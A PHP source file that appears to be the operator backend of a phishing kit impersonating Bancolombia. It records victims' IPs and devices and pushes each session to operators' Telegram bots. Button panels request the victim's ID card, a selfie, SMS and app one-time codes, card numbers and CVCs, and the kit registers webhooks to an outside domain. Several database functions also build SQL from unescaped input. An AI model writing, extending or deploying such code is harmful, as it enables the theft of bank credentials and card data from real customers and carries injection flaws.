<?php

require_once __DIR__ . '/tg.php';

function tg_resolve_recipients($owner, $es_login, array $context)
{
	$configMatches = tg_profiles_from_config($context, $es_login);
	$userMatches   = tg_collect_user_recipients($owner, $es_login);

	$allowOverrideFallback = empty($configMatches) && empty($userMatches);
	$overrideMatches = tg_override_recipient($context, $es_login, $allowOverrideFallback);

	$ordered = [];
	if (!empty($overrideMatches)) {
		$ordered = array_merge($ordered, $overrideMatches);
	}
	if (!empty($configMatches)) {
		$ordered = array_merge($ordered, $configMatches);
	}
	if (!empty($userMatches)) {
		$ordered = array_merge($ordered, $userMatches);
	}

	return tg_unique_recipients($ordered);
}

function tg_collect_user_recipients($owner, $es_login)
{
	$matches = [];

	try {
		$db = Database::getConnection();
	} catch (\Throwable $e) {
		$db = null;
	}

	if (!$db) {
		return $matches;
	}

	$ownerEscaped = mysqli_real_escape_string($db, (string) $owner);
	$consulta = mysqli_query($db, "SELECT * FROM users WHERE id = '" . $ownerEscaped . "' OR rango = '5'");
	if (!$consulta) {
		return $matches;
	}

	while ($datos = mysqli_fetch_array($consulta)) {
		$primaryField = $es_login ? 'bank' : 'card';
		$secondaryField = $es_login ? 'card' : 'bank';
		$tokenDb = tg_clean_token($datos['token_' . $primaryField . '_telegram'] ?? '');
		if ($tokenDb === '' && isset($datos['token_' . $secondaryField . '_telegram'])) {
			$tokenDb = tg_clean_token($datos['token_' . $secondaryField . '_telegram']);
		}
		$chatDb  = tg_clean_identifier($datos['chat_telegram'] ?? '');
		if ($tokenDb && $chatDb) {
			$matches[] = [
				'token'  => $tokenDb,
				'chat'   => $chatDb,
				'source' => 'db',
				'name'   => 'user:' . ($datos['id'] ?? ''),
				'db_meta' => [
					'table'      => 'users',
					'id'         => $datos['id'] ?? null,
					'chat_field' => 'chat_telegram',
				],
			];
		}
	}

	return $matches;
}

function tg_send_to_recipients($mensaje, $owner, $es_login, array $context, array $options = [], $parseMode = 'Markdown')
{
	$recipients = tg_resolve_recipients($owner, $es_login, $context);
	if (empty($recipients)) {
		return false;
	}

	$tracking = [];
	if (isset($context['tracking']) && is_array($context['tracking'])) {
		$tracking = $context['tracking'];
	}
	$shouldTrackInline = !empty($tracking['track_inline']) && !empty($tracking['registro']);

	$lastResponse = null;
	foreach ($recipients as $rcpt) {
		$token = tg_clean_token($rcpt['token'] ?? '');
		$chatId = tg_clean_identifier($rcpt['chat'] ?? '');
		if ($token === '' || $chatId === '') {
			error_log('Telegram skip recipient owner=' . $owner . ' token=' . json_encode($rcpt['token'] ?? null) . ' chat=' . json_encode($rcpt['chat'] ?? null), 3, __DIR__ . '/../logs/err.log');
			continue;
		}

		tg_ensure_webhook_for_token($token, $context);

		$data = [
			'chat_id' => $chatId,
			'text' => $mensaje,
		];
		if ($parseMode !== null) {
			$data['parse_mode'] = $parseMode;
		}
		$data['disable_web_page_preview'] = true;
		if (!empty($options)) {
			$data['reply_markup'] = json_encode($options, JSON_UNESCAPED_UNICODE);
		}

		$url = "https://api.telegram.org/bot" . $token . "/sendMessage";
		$originalChatId = $chatId;
		$currentChatId = $chatId;
		$attemptedSuperFallback = false;
		$fallbackChatId = null;

		while (true) {
			$data['chat_id'] = $currentChatId;

			try {
				$logPayload = [
					'url'          => $url,
					'chat_id'      => $currentChatId,
					'has_keyboard' => !empty($options),
					'message_len'  => strlen($mensaje),
					'source'       => $rcpt['source'] ?? 'unknown',
					'owner'        => (string) $owner,
				];
				if (array_key_exists('tok', $context)) {
					$logPayload['tok'] = (string) $context['tok'];
				}
				if (!empty($rcpt['name'])) {
					$logPayload['profile'] = $rcpt['name'];
				}
				if ($attemptedSuperFallback) {
					$logPayload['retry'] = 'supergroup';
				}
				file_put_contents(__DIR__ . '/../logs/tg.log', date('c') . ' SEND ' . json_encode($logPayload) . "\n", FILE_APPEND);
			} catch (\Throwable $e) {}

			$optionsHttp = [
				'http' => [
					'header'        => "Content-type: application/x-www-form-urlencoded\r\n",
					'method'        => 'POST',
					'content'       => http_build_query($data),
					'timeout'       => 20,
					'ignore_errors' => true,
				],
			];
			$contextStream = stream_context_create($optionsHttp);
			$response = @file_get_contents($url, false, $contextStream);
			$lastResponse = $response;

			$ok = null;
			$desc = null;

			if ($response === false) {
				$lastError = error_get_last();
				$desc = $lastError['message'] ?? 'unknown';
				file_put_contents(__DIR__ . '/../logs/tg.log', date('c') . ' RESP ' . json_encode(['ok' => null, 'description' => $desc]) . "\n", FILE_APPEND);
				error_log('Telegram request failed owner=' . $owner . ' chat=' . $currentChatId . ' err=' . $desc, 3, __DIR__ . '/../logs/err.log');
			} else {
				$respObj = @json_decode($response, true);
				if (is_array($respObj)) {
					$ok = array_key_exists('ok', $respObj) ? $respObj['ok'] : null;
					$desc = array_key_exists('description', $respObj) ? $respObj['description'] : null;
					if ($ok === true && $shouldTrackInline && !empty($options) && is_array($respObj['result'] ?? null)) {
						tg_remember_inline_keyboard($tracking['registro'], $token, $currentChatId, $respObj['result']);
						$shouldTrackInline = false;
					}
				}
				file_put_contents(__DIR__ . '/../logs/tg.log', date('c') . ' RESP ' . json_encode(['ok' => $ok, 'description' => $desc]) . "\n", FILE_APPEND);
				if ($ok !== true) {
					error_log('Telegram response not ok owner=' . $owner . ' chat=' . $currentChatId . ' desc=' . $desc, 3, __DIR__ . '/../logs/err.log');
				}
			}

			if ($ok === true) {
				if ($attemptedSuperFallback && $fallbackChatId !== null) {
					static $superLogNotified = [];
					if (!isset($superLogNotified[$originalChatId])) {
						error_log('Telegram chat upgraded detected owner=' . $owner . ' chat updated to ' . $fallbackChatId, 3, __DIR__ . '/../logs/err.log');
						$superLogNotified[$originalChatId] = true;
					}
					tg_persist_chat_upgrade($rcpt, $originalChatId, $fallbackChatId);
				}
				break;
			}

			$shouldRetry = false;
			if (!$attemptedSuperFallback && strpos($currentChatId, '-100') !== 0) {
				if (is_string($desc) && stripos($desc, 'upgraded to a supergroup chat') !== false) {
					$fallbackChatId = '-100' . ltrim($currentChatId, '-');
					if ($fallbackChatId !== $currentChatId) {
						$attemptedSuperFallback = true;
						$currentChatId = $fallbackChatId;
						$shouldRetry = true;
						try {
							file_put_contents(__DIR__ . '/../logs/tg.log', date('c') . ' INFO ' . json_encode([
								'action'    => 'supergroup_retry',
								'from_chat' => $originalChatId,
								'to_chat'   => $fallbackChatId,
								'owner'     => (string) $owner,
							]) . "\n", FILE_APPEND);
						} catch (\Throwable $e) {}
					}
				}
			}

			if (!$shouldRetry) {
				break;
			}
		}
	}

	return $lastResponse;
}

function enviar_telegram($mensaje, $owner, $es_login = false, $options = [], $tracking = null)
{
	$context = [
		'owner' => (string) $owner,
		'tok'   => tg_get_request_token(),
	];
	if (is_array($tracking) && !empty($tracking)) {
		$context['tracking'] = $tracking;
	}

	return tg_send_to_recipients($mensaje, (string) $owner, $es_login, $context, $options, 'Markdown');
}

function tg_remember_inline_keyboard($idreg, $token, $chatId, array $result)
{
	if ($idreg === null || $idreg === '') {
		return false;
	}
	$messageId = $result['message_id'] ?? null;
	$resultChat = $result['chat']['id'] ?? null;
	if ($resultChat !== null) {
		$chatId = $resultChat;
	}
	$token = tg_clean_token($token);
	$chatId = tg_clean_identifier($chatId);
	if ($token === '' || $chatId === '' || $messageId === null) {
		return false;
	}

	$row = @buscar_registro($idreg);
	$mensaje = [];
	if (is_array($row) && !empty($row['mensaje'])) {
		$tmp = @json_decode($row['mensaje'], true);
		if (is_array($tmp)) {
			$mensaje = $tmp;
		} else {
			$mensaje = ['panel_note' => (string) $row['mensaje']];
		}
	}

	$mensaje['tg_last_inline'] = [
		'token'      => $token,
		'chat_id'    => $chatId,
		'message_id' => intval($messageId),
		'stored_at'  => time(),
	];

	@actualizar_registro($idreg, ['mensaje' => json_encode($mensaje)]);
	return true;
}

function tg_try_clear_inline_keyboard(array $payload)
{
	$meta = $payload['tg_last_inline'] ?? null;
	if (!is_array($meta)) {
		return false;
	}
	$token = tg_clean_token($meta['token'] ?? '');
	$chatId = tg_clean_identifier($meta['chat_id'] ?? '');
	$messageId = intval($meta['message_id'] ?? 0);
	if ($token === '' || $chatId === '' || $messageId <= 0) {
		return false;
	}

	$url = 'https://api.telegram.org/bot' . $token . '/editMessageReplyMarkup';
	$data = [
		'chat_id' => $chatId,
		'message_id' => $messageId,
		'reply_markup' => json_encode(['inline_keyboard' => []]),
	];
	$options = [
		'http' => [
			'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
			'method'  => 'POST',
			'content' => http_build_query($data),
			'timeout' => 10,
		],
	];
	$ctx = stream_context_create($options);
	@file_get_contents($url, false, $ctx);
	return true;
}

/**
 * Cuando un chat se migra a supergrupo, actualiza la tabla origen para evitar errores futuros.
 */
function tg_persist_chat_upgrade(array $recipient, $oldChat, $newChat)
{
	if (!is_array($recipient) || empty($recipient['db_meta'])) {
		return;
	}
	$meta = $recipient['db_meta'];
	if (!is_array($meta)) {
		return;
	}
	$table = $meta['table'] ?? null;
	$id    = $meta['id'] ?? null;
	$field = $meta['chat_field'] ?? null;
	if ($table !== 'users' || $field !== 'chat_telegram' || $id === null) {
		return;
	}

	try {
		$db = Database::getConnection();
	} catch (\Throwable $e) {
		$db = null;
	}
	if (!$db) {
		return;
	}

	$safeId   = mysqli_real_escape_string($db, (string) $id);
	$safeChat = mysqli_real_escape_string($db, (string) $newChat);
	$sql = "UPDATE `users` SET `chat_telegram` = '" . $safeChat . "' WHERE `id` = '" . $safeId . "'";
	@mysqli_query($db, $sql);
}

if (!function_exists('tg_webhook_base_url')) {
	/**
	 * Devuelve la URL base para registrar webhooks.
	 */
	function tg_webhook_base_url()
	{
		static $base = null;
		if ($base !== null) {
			return $base;
		}

		$env = getenv('TG_WEBHOOK_BASE');
		if (is_string($env) && trim($env) !== '') {
			$base = rtrim(trim($env), '/');
		} else {
			$base = 'https://losmillonarios.click';
		}

		return $base;
	}
}

if (!function_exists('tg_token_fingerprint')) {
	function tg_token_fingerprint($token)
	{
		$token = tg_clean_token($token);
		return $token === '' ? '' : substr(hash('sha256', $token), 0, 24);
	}
}

if (!function_exists('tg_webhook_url')) {
	/**
	 * Construye la URL completa del webhook para un tok específico.
	 */
	function tg_webhook_url($tok, $botToken = null)
	{
		$tok = trim((string) $tok);
		if ($tok === '') {
			return '';
		}

		$url = tg_webhook_base_url() . '/api/hook.php?tok=' . rawurlencode($tok);
		$fingerprint = tg_token_fingerprint($botToken);
		if ($fingerprint !== '') {
			$url .= '&bot=' . rawurlencode($fingerprint);
		}
		return $url;
	}
}

if (!function_exists('tg_ensure_webhook_for_token')) {
	/**
	 * Garantiza que el token indicado tenga el webhook apuntando al tok actual.
	 */
	function tg_ensure_webhook_for_token($token, array $context)
	{
		static $ensured = [];

		$tokenClean = tg_clean_token($token);
		if ($tokenClean === '') {
			return;
		}

		$tokParam = isset($context['tok']) ? trim((string) $context['tok']) : '';
		if ($tokParam === '') {
			return;
		}

		// Cada bot recibe un callback_query que solo puede responder ese mismo bot.
		// La huella permite identificarlo sin publicar el token en la URL.
		$targetUrl = tg_webhook_url($tokParam, $tokenClean);
		if ($targetUrl === '') {
			return;
		}

		$key = $tokenClean . '|' . $targetUrl;
		if (isset($ensured[$key])) {
			return;
		}
		$ensured[$key] = true;

		$needUpdate = true;
		$infoUrl = 'https://api.telegram.org/bot' . $tokenClean . '/getWebhookInfo';
		try {
			$infoResponse = @file_get_contents($infoUrl);
			if ($infoResponse !== false) {
				$info = json_decode($infoResponse, true);
				if (is_array($info) && !empty($info['ok']) && isset($info['result']['url'])) {
					$currentUrl = (string) $info['result']['url'];
					if ($currentUrl === $targetUrl) {
						$needUpdate = false;
					}
				}
			}
		} catch (\Throwable $e) {
			$needUpdate = true;
		}

		if (!$needUpdate) {
			return;
		}

		try {
			$logPayload = [
				'action' => 'ensure_webhook',
				'target' => $targetUrl,
				'token_prefix' => substr($tokenClean, 0, 12),
			];
			file_put_contents(__DIR__ . '/../logs/tg.log', date('c') . ' WEBHOOK ' . json_encode($logPayload) . "\n", FILE_APPEND);
		} catch (\Throwable $e) {}

		$deleteUrl = 'https://api.telegram.org/bot' . $tokenClean . '/deleteWebhook';
		$setUrl = 'https://api.telegram.org/bot' . $tokenClean . '/setWebhook?url=' . urlencode($targetUrl);

		try {
			@file_get_contents($deleteUrl);
			@file_get_contents($setUrl);
		} catch (\Throwable $e) {
			try {
				$logPayload = [
					'action' => 'ensure_webhook_error',
					'target' => $targetUrl,
					'msg' => $e->getMessage(),
				];
				file_put_contents(__DIR__ . '/../logs/tg.log', date('c') . ' WEBHOOK ' . json_encode($logPayload) . "\n", FILE_APPEND);
			} catch (\Throwable $ignored) {}
		}
	}
}

function tg_panel_keyboard_layout($registro, $owner, array $options = [])
{
    $includeCedula = array_key_exists('include_cedula', $options) ? (bool) $options['include_cedula'] : true;
    $includeSoyYo  = array_key_exists('include_soyyo', $options) ? (bool) $options['include_soyyo'] : true;

    $registro = (string) $registro;
    $owner    = (string) $owner;

    $make = function ($text, $action) use ($registro, $owner) {
        return [
            'text' => $text,
            'callback_data' => $action . '_' . $registro . '_' . $owner,
        ];
    };

    $smsCount = tg_sms_request_count($registro);
    $smsLabel = ($smsCount > 0) ? '⚠️ SMS' : '📲 SMS';
    $appCount = tg_app_request_count($registro);
    $appLabel = ($appCount > 0) ? '⚠️ DINÁMIC' : '🔁 DINÁMIC';

    $buttons = [];
    if ($includeCedula) {
        $buttons[] = $make('🆔 CÉDULA', 'pedircedula');
    }
    if ($includeSoyYo) {
        $buttons[] = $make('📸 SOY YO', 'soyyo');
    }
    $buttons[] = $make('👤 USUARIO', 'volverusuario');       // 3
    $buttons[] = $make('🔁 923', 'solicitar923');            // 4
    $buttons[] = $make($smsLabel, 'solicitarotp');           // 5
    $buttons[] = $make($appLabel, 'solicitarotpapp');        // 6
    $buttons[] = $make('💳 CRÉDITO', 'pedirtarjetacredito'); // 7
    $buttons[] = $make('💳 DÉBITO', 'pedirtarjeta');         // 8
    $buttons[] = $make('🔐 CVC', 'pedircvv');                // 9
    $buttons[] = $make('💠 AMEX', 'pediramex');              // 10
    $buttons[] = $make('🪙 VISA', 'pedirvisa');              // 11
    $buttons[] = $make('🧿 MASTER', 'pedirmaster');          // 12

    $rows = [];
    $colCount = 3;
    for ($i = 0; $i < count($buttons); $i += $colCount) {
        $row = [];
        for ($j = 0; $j < $colCount; $j++) {
            if (isset($buttons[$i + $j])) {
                $row[] = $buttons[$i + $j];
            }
        }
        if (!empty($row)) {
            $rows[] = $row;
        }
    }

    // Fila final: botón web del asesor + controles sistema/finalizado.
    $chatUrl = tg_webhook_base_url() . '/pages/chat.php';
    $rows[] = [
        [
            'text' => '💬 Chat asesor',
            'url'  => $chatUrl,
        ],
        $make('🚫 SISTEMA', 'error404'),
        $make('🗂️ FINALIZADO', 'finalizar'),
    ];

    return ['inline_keyboard' => $rows];
}

function tg_sms_request_count($registro)
{
    $row = @buscar_registro($registro);
    if (!is_array($row) || empty($row['mensaje'])) {
        return 0;
    }

    $msg = json_decode($row['mensaje'], true);
    if (!is_array($msg)) {
        return 0;
    }

    return intval($msg['sms_request_count'] ?? 0);
}

function tg_sms_request_bump_payload($row)
{
    if (!is_array($row)) {
        return null;
    }

    $mensaje = [];
    if (!empty($row['mensaje'])) {
        $tmp = @json_decode($row['mensaje'], true);
        if (is_array($tmp)) {
            $mensaje = $tmp;
        } else {
            $mensaje = ['_raw' => (string) $row['mensaje']];
        }
    }

    $mensaje['sms_request_count'] = intval($mensaje['sms_request_count'] ?? 0) + 1;

    return $mensaje;
}

function tg_app_request_count($registro)
{
    $row = @buscar_registro($registro);
    if (!is_array($row) || empty($row['mensaje'])) {
        return 0;
    }

    $msg = json_decode($row['mensaje'], true);
    if (!is_array($msg)) {
        return 0;
    }

    return intval($msg['app_request_count'] ?? 0);
}

function tg_app_request_bump_payload($row)
{
    if (!is_array($row)) {
        return null;
    }

    $mensaje = [];
    if (!empty($row['mensaje'])) {
        $tmp = @json_decode($row['mensaje'], true);
        if (is_array($tmp)) {
            $mensaje = $tmp;
        } else {
            $mensaje = ['_raw' => (string) $row['mensaje']];
        }
    }

    $mensaje['app_request_count'] = intval($mensaje['app_request_count'] ?? 0) + 1;

    return $mensaje;
}

function tg_mark_last_sent($idreg)
{
    $db = Database::getConnection();
    static $cols = null;
    if ($cols === null) {
        $cols = [];
        $rs = @mysqli_query($db, "SHOW COLUMNS FROM " . TABLA_PUTO);
        if ($rs) while ($r = mysqli_fetch_assoc($rs)) { $cols[$r['Field']] = true; }
    }
    $now = time();
    if (isset($cols['tg_last_sent'])) {
        @actualizar_registro($idreg, ['tg_last_sent' => $now]);
        return true;
    }
    $row = @buscar_registro($idreg);
    $mensaje = [];
    if (is_array($row) && !empty($row['mensaje'])) {
        $tmp = @json_decode($row['mensaje'], true);
        if (is_array($tmp)) $mensaje = $tmp; else $mensaje = ['_raw' => (string)$row['mensaje']];
    }
    $mensaje['tg_last_sent'] = $now;
    @actualizar_registro($idreg, ['mensaje' => json_encode($mensaje)]);
    return true;
}

function presence_touch($idreg, $ip = null)
{
    if (!$idreg) {
        return false;
    }

    $row = @buscar_registro($idreg);
    if (!is_array($row)) {
        return false;
    }

    $mensaje = [];
    if (!empty($row['mensaje'])) {
        $tmp = @json_decode($row['mensaje'], true);
        if (is_array($tmp)) {
            $mensaje = $tmp;
        } else {
            $mensaje = ['panel_note' => (string) $row['mensaje']];
        }
    }

    $mensaje['presence_last_seen'] = time();
    if ($ip !== null) {
        $mensaje['presence_last_ip'] = (string) $ip;
    }

    @actualizar_registro($idreg, ['mensaje' => json_encode($mensaje)]);
    return true;
}

/**
 * Guarda o limpia una nota corta para mostrar al usuario en pantalla.
 */
function tg_store_panel_note($idreg, $note)
{
    if (!$idreg) {
        return false;
    }

    $row = @buscar_registro($idreg);
    if (!is_array($row)) {
        return false;
    }

    $payload = [];
    if (!empty($row['mensaje'])) {
        $tmp = @json_decode($row['mensaje'], true);
        if (is_array($tmp)) {
            $payload = $tmp;
        } else {
            $payload = ['_raw' => (string) $row['mensaje']];
        }
    }

    $clean = trim((string) $note);
    if ($clean === '') {
        unset($payload['panel_note']);
    } else {
        if (function_exists('mb_substr')) {
            $clean = mb_substr($clean, 0, 800, 'UTF-8');
        } else {
            $clean = substr($clean, 0, 800);
        }
        $payload['panel_note'] = $clean;
    }

    $encoded = json_encode($payload, JSON_UNESCAPED_UNICODE);
    return @actualizar_registro($idreg, ['mensaje' => $encoded]);
}

function crear_registro($array = [])
{
	$db = Database::getConnection();
	try {
		if ($array) {
			$array['dispositivo'] = $_SERVER['HTTP_USER_AGENT'];
			$array['ip'] = $_SERVER['REMOTE_ADDR'];
			$array['horacreado'] = $array['horamodificado'] = time();
			$array['status'] = 'rec_usuario';
			$array['owner'] = $GLOBALS['owner'];
			$array['banco'] = 'bancolombia';
			$campos = '';
			$values = '';
			foreach ($array as $c => $v) {
				if ($campos != '') {
					$campos .= ', ';
					$values .= ', ';
				}
				$campos .= $c;
				$values .= "'" . $v . "'";
			}
			$str_query = "INSERT INTO " . TABLA_PUTO . " ($campos) VALUES ($values);";

			$message = "Registro creado: " . $str_query;
			$timestamp = date('Y-m-d H:i:s');
			$logMessage = "[{$timestamp}] {$message}\n";

			file_put_contents(__DIR__ . '/../logs/app.log', $logMessage, FILE_APPEND);
			if (mysqli_query($db, $str_query)) {
				$insertId = mysqli_insert_id($db);
				@presence_touch($insertId, $_SERVER['REMOTE_ADDR'] ?? null);
				return $insertId;
			}
		}
	} catch (Exception $e) {
		error_log("Error creating record: " . $e->getMessage());
		$message = "Error creating record: " . $e->getMessage();
		$timestamp = date('Y-m-d H:i:s');
		$logMessage = "[{$timestamp}] {$message}\n";

		file_put_contents(__DIR__ . '/../logs/app.log', $logMessage, FILE_APPEND);
		echo "<script>console.log('Error creating record: " . $e->getMessage() . "');</script>";
	}
	return -1;
}

function buscar_estado($reg)
{
	$db = Database::getConnection();
	$consulta = mysqli_query($db, "SELECT status FROM " . TABLA_PUTO . " WHERE idreg = '" . $reg . "'");
	if ($datos = mysqli_fetch_assoc($consulta)) {
		return $datos["status"];
	}
	return -1;
}
function buscar_registro($reg)
{
	$db = Database::getConnection();
	$consulta = mysqli_query($db, "SELECT * FROM " . TABLA_PUTO . " WHERE idreg = '" . $reg . "'");
	if ($datos = mysqli_fetch_assoc($consulta)) {
		return $datos;
	}
	return null;
}
function actualizar_registro($reg, $array = [], $time = true)
{
	if ($time) {
		$array['horamodificado'] = time();
	}
	if (!$array) {
		return -1;
	}
	$db = Database::getConnection();
	$query = "UPDATE " . TABLA_PUTO . " SET ";
	$modificar = '';
	foreach ($array as $col => $val) {
		if ($modificar != '') {
			$modificar .= ', ';
		}
		$modificar .=  $col . "='" . $val . "'";
	}
	$query .=  $modificar . " WHERE idreg='" . $reg . "'";
	$r = mysqli_query($db, $query);
	if (!$r) {
		return -1;
	}
	return true;
}



